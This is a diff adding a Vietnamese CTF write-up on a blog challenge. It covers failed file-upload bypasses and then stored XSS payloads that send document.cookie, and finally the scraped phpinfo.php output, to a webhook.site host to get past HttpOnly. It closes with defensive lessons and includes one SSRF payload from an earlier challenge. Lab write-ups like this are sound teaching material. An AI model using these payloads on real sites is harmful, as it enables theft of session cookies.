@@ -130,7 +130,154 @@ try {
 
 - URL mục tiêu cần gọi : `http://127.0.0.1/admin.php?username=test1&coin=999999&secret=ChiCon1BuocNuaThoi~_~`, nhưng nếu ta nhúng trực tiếp url trên vào tham số image thì server sẽ hiểu rằng `&` là dấu ngắt tham số dẫn đến mất dữ liệu `coin` và `secret`. -> cần phải encoding `&` thành `%26` .
 
-- **Payload**: **`GET /file.php?image=http://127.0.0.1/admin.php?username=test1%26coin=999999%26secret=ChiCon1BuocNuaThoi~_~`** 
+- **Payload**: **`GET /file.php?image=http://127.0.0.1/admin.php?username=test1%26coin=999999%26secret=ChiCon1BuocNuaThoi~_~`**
+
+
+# Write-up : Hori 's blog
+
+# 1. Mục tiêu 
+
+- Một trang web dạng Blog cho phép người dùng đăng bài viết (gồm Tiêu đề, Nội dung, và Upload ảnh). 
+- Hệ thống có một trang bot.php để gửi đường dẫn cho Bot (Admin) truy cập. 
+- Ngoài ra còn có trang `phpinfo.php`.
+- Mục tiêu cần đạt: Lấy được Flag nằm trong Cookie của Admin (Bot).
+
+# 2. Phân tích và khai thác 
+
+***Lần thứ 1*** :
+-
+- Mình thử truy cập vào POST thì thấy có mục upload file nên nghi ngờ lỗ hổng Unrestricted File Upload 😓
+- Mình thử upload một file PHP xem sao kết quả web trả về ❌ Only image files (PNG, JPG, GIF) are allowed. Vậy là Server chặn, chỉ cho phép đuôi ảnh (.jpg, .png, .gif).
+- Không chịu thua , mình thử bypass bằng Double Extension và chỉnh Magic Bytes.
+  
+  - Đổi tên file thành `shell.php.gif` (Double Extension) Để lừa bộ lọc đuôi file: Server nhìn thấy đuôi `.gif` ở cuối cùng -> "À, đây là file ảnh, cho qua!".
+  - Vì máy tính thường quản lí , đọc file các thứ dựa trên các dòng mã nhị phân nhưng nếu nó đọc hết nội dung một file thì quá lâu để có thể xử lý cho nên thường thì chỉ đọc vài byte đầu tiên để phân biệt các loại file thôi 
+  - vậy nên trong cái file mình chèn vào đó , ở dòng để tiên sẽ chèn thêm GIF89a ở đầu ( đây là của file gif ) ,Khi Server đọc file, nó thấy chữ GIF89a ở đầu -> "Nội dung file này đúng chuẩn GIF rồi, không phải file rác."
+- **Kết quả**: Upload thành công, nhưng khi truy cập file, Server chỉ hiển thị nó như một bức ảnh lỗi, không thực thi mã PHP.
+- Tiếp tục mình lại thử bypass bằng **.htaccess** để ép server chạy file ảnh như file php nhưng lại quên mất ban đầu nó đã nói chỉ cho chạy file `.jpg` , `.png` , `.gif` . 
+- Kết quả: Thất bại. Server chặn tên file , chỉ chấp nhận các đuôi mở rộng hình ảnh hợp lệ.
+
+**Kết luận : Server được cấu hình tốt, không thể khai thác lỗ hổng Upload để chạy mã lệnh**
+-
+***Lần thứ 2:***
+-
+Dựa vào gợi ý "Flag in cookie", mục tiêu chuyển sang tấn công XSS để đánh cắp Cookie của Bot.
+
+Đầu tiên mình thử kiểm tra xem các điểm đầu vào coi phần input nào không được bảo mật kĩ càng . Thử chèn payload đơn giản `<script>alert(1)</scrpit>` vào Title , Nội dung . 
+
+Sau khi thử chèn vào các vị trí, mình kiểm tra Source Code và nhận được kết quả thú vị:
+
+- Tại Tiêu đề (Title): Thất bại. Server đã mã hóa các ký tự đặc biệt. Dấu < bị biến thành `&lt`. Code không thể chạy 
+- Tại Nội dung (Content): Thành công! Server giữ nguyên các thẻ HTML mà mình nhập vào ( như <script>). -> Kết luận: Lỗ hổng XSS nằm ở phần Content của bài viết.
+
+
+
+Tiếp theo mình sẽ tạo một Webhook  đóng vai trò là server của kẻ tấn công để hứng dữ liệu trả về. Mình sử dụng Payload sau chèn vào phần Content:
+
+`<script>
+  fetch('https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?c=' + document.cookie);
+</script>`
+
+- _Giải thích:_
+
+  `<script>...</script>`: Khai báo cho trình duyệt biết đây là đoạn mã JavaScript
+
+  `document.cookie`: Lệnh JavaScript dùng để truy xuất toàn bộ Cookie của người dùng hiện tại (ở đây là Bot).
+
+  `fetch(...)`: Hàm trong JavaScript dùng để gửi một HTTP Request đến một địa chỉ khác
+
+  `?c=...`: gắn giá trị Cookie lấy được vào tham số c trên URL. Khi Webhook nhận được request, chỉ cần nhìn vào URL là thấy Cookie.
+
+
+  <img width="925" height="895" alt="image" src="https://github.com/user-attachments/assets/9f64dd76-549e-4da5-8228-2ecff0073c68" />
+
+
+Sau khi gửi link bài viết chứa mã độc cho Bot truy cập, Webhook của mình đã không nhận được bất kì một request nào , có thể là do thẻ `<script>` nó không hoạt động 
+
+
+<img width="811" height="580" alt="image" src="https://github.com/user-attachments/assets/51e6384e-901d-4066-9173-99e599f9b709" />
+
+<img width="1025" height="813" alt="image" src="https://github.com/user-attachments/assets/a98acc73-ca5a-49ef-b1eb-3f64cfe69722" />
+
+
+
+
+Sau đó mình thử chuyển sang sử dụng payload "uy tín" hơn là thẻ `<img>` kết hợp sự kiện `onerror`
+
+- `<img src=x onerror="fetch('https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?flag='+document.cookie)">`
+
+Giải thích câu lệnh cho các bạn dễ hiểu thì 
+ - `src=x`: Đường dẫn ảnh sai, chắc chắn sẽ gây lỗi tải ảnh.
+
+- `onerror="..."`: Khi lỗi xảy ra, trình duyệt lập tức chạy đoạn code JS bên trong dấu ngoặc kép
+
+Sau khi gửi link bài viết chứa mã độc cho Bot truy cập , Webhook của mình lần này đã nhận được request nhưng cookie nó trả về lại là 1 chuỗi rỗng . 
+
+Nguyên nhân: Server đã bật cờ HttpOnly cho Cookie của Admin.Vì thế, lệnh document.cookie trả về chuỗi rỗng, và chúng ta không lấy được Flag trực tiếp.
+
+- Giải thích thềm về HttpOnly : _Là một lớp bảo vệ bảo mật được gán cho Cookie. Khi Cookie có cờ này, trình duyệt sẽ ngăn chặn JavaScript (lệnh document.cookie) đọc giá trị của nó. Mục đích chính là để giảm thiểu thiệt hại khi trang web bị lỗi XSS_.
+
+
+
+---
+***Lần thứ 3***
+-
+Bây giờ chỉ còn lại trang `PHPINFO` là chưa được khai thác đến 
+- Quan sát: Trang này hiển thị chi tiết mọi thông tin cấu hình của PHP trên server: phiên bản PHP, hệ điều hành (OS), các module extension, và các biến môi trường...
+
+- Mình thử Ctrl + F tìm chữ `"flag"` xem có vô tình lộ lọt gì không, nhưng kết quả là con số 0 tròn trĩnh 😓. Có vẻ Flag không nằm cố định ở đây.
+Tuy nhiên, sau khi tìm hiểu thì có cơ chế hoạt động đặc biệt của hàm `phpinfo()`: `Trang phpinfo()` không chỉ hiển thị cấu hình tĩnh của server, mà nó còn in ra toàn bộ HTTP Headers của request gửi đến nó.
+
+Điều này có nghĩa là:
+ 
+- Nếu mình (User thường) truy cập -> Nó in Cookie của mình.
+- Nếu Bot (Admin) truy cập -> Nó sẽ in Cookie của Admin (chứa Flag) ra màn hình dưới dạng văn bản (Text).
+- Và quan trọng nhất: Khi Cookie đã biến thành văn bản HTML nằm trên trang web, thì JavaScript hoàn toàn có thể đọc được, bất chấp việc Cookie đó có cờ `HttpOnly` hay không (vì JS đang đọc nội dung trang web `response.text()`, chứ không phải đọc `document.cookie`).
+
+-> Kế hoạch tấn công mới (Exploit Chain): Sử dụng lỗ hổng XSS đã tìm thấy ở phần Content, viết một đoạn mã JavaScript bắt trình duyệt của Bot thực hiện 2 việc:
+
+- Truy cập ngầm (fetch) vào /phpinfo.php để kích hoạt việc in Cookie Admin ra Source Code.
+- Đọc toàn bộ Source Code đó và gửi về Webhook của mình.
+
+Payload (Chèn vào phần Content):
+
+```javascript
+<img src=x onerror="
+    fetch('/phpinfo.php')
+    .then(r => r.text())
+    .then(d => {
+        fetch('https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: d
+        })
+    })
+">
+```
+Giải thích : 
+- `src=x`: Đường dẫn ảnh sai, chắc chắn sẽ gây lỗi tải ảnh.
+- `onerror="..."`: Khi lỗi xảy ra, trình duyệt lập tức chạy đoạn code JS bên trong dấu ngoặc kép.
+- Đoạn JS bên trong thực hiện 2 bước: (1) Đọc trộm trang `phpinfo.php` -> (2) Bắn dữ liệu về Webhook.
+
+<img width="981" height="934" alt="image" src="https://github.com/user-attachments/assets/a4d00c77-4dc4-40ef-b2fd-35ffbf42f44b" />
+
+
+Quay sang webhook , mình nhận về một mớ dữ liệu hỗn độn thử Ctrl + F từ flag thì thấy `FLAG=KCSC{PhP_InFO_d1sPl4Ys_c0okIe_iNf0rm4tiOn!!!}`
+
+# 3. Bài học rút ra
+Góc nhìn phòng thủ : 
+-
+- Phải áp dụng cơ chế làm sạch (Sanitize) và mã hóa (Encode) đầu vào trên tất cả các trường mà người dùng có thể nhập liệu. Chỉ một sơ hở nhỏ cũng dẫn đến XSS.
+- HttpOnly chỉ ngăn chặn việc đọc cookie trực tiếp bằng JS (document.cookie), nhưng không ngăn chặn việc cookie bị lộ qua các kênh khác (như phpinfo, các trang debug, hoặc lỗi lộ header)
+- Các file như phpinfo.php, test.php, .git, .env... là kho báu của Hacker. Luôn xóa sạch các file debug và file cấu hình thừa trước khi public website.
+
+Góc nhìn tấn công  
+- 
+- Khi thấy một chỗ bị chặn (ví dụ Title bị lọc), đừng vội nản lòng. Hãy thử tất cả các đầu vào khác (Content) . Developer thường chỉ fix những chỗ "nổi bật" và bỏ quên những chỗ khuất.
+- Đừng chỉ dập khuôn dùng `<script>alert(1)</script>`.
+- Nếu `<script`> bị chặn hoặc không chạy (do `innerHTML`), hãy chuyển sang các thẻ khác như `<img>`, `<body>`, `<svg>` kết hợp với các sự kiện `onerror`, `onload`.
+- Bài này dạy kỹ thuật kết hợp: Dùng XSS để kích hoạt lỗi lộ thông tin (phpinfo), từ đó bypass cơ chế bảo vệ (HttpOnly) để đạt mục đích cuối cùng (Lấy Cookie).
+- Hiểu rằng trình duyệt luôn tự động gửi Cookie kèm theo request (kể cả HttpOnly)
 
 - **Kết quả** : **Đã cập nhật coin cho <b>test1</b> thành <b>999999</b>!**
 
